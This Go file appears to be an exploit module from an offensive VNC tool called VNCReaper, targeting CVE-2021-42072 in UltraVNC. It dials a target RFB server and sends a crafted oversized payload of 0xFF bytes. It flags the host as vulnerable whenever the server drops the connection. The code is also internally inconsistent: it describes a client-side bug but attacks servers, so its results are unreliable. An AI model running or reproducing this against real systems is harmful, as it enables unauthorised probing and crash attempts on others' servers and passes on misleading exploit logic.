package cves

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/comedymoon/VNCReaper/internal/types"
)

// CVE-2021-42072 - UltraVNC client heap overflow via crafted server framebuffer update
type CVE2021_42072 struct{}

func (c CVE2021_42072) Name() string {
	return "CVE-2021-42072"
}

func (c CVE2021_42072) Description() string {
	return "UltraVNC client heap overflow via crafted FramebufferUpdate message from malicious server."
}

func (c CVE2021_42072) Exploit(target types.ScanResult) (bool, string) {
	// Only RFB servers are relevant
	if !strings.EqualFold(target.Protocol, "RFB") {
		return false, ""
	}

	address := net.JoinHostPort(target.IP, target.Port)
	conn, err := net.DialTimeout("tcp", address, 5*time.Second)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	// Initiate handshake
	_, _ = conn.Write([]byte("RFB 003.008\n"))

	// Malicious framebuffer update that triggers UltraVNC bug
	// (simplified for detection; actual PoC is longer)
	payload := append([]byte{0, 0, 0, 0}, []byte(strings.Repeat("\xFF", 1024))...)
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Write(payload)
	if err != nil {
		return false, ""
	}

	// If server reacts oddly or drops, it might be vulnerable
	buf := make([]byte, 8)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err = conn.Read(buf)
	if err != nil {
		return true, fmt.Sprintf("Server at %s reacted unexpectedly to CVE-2021-42072 probe", address)
	}

	return false, ""
}

func init() {
	Register(CVE2021_42072{})
}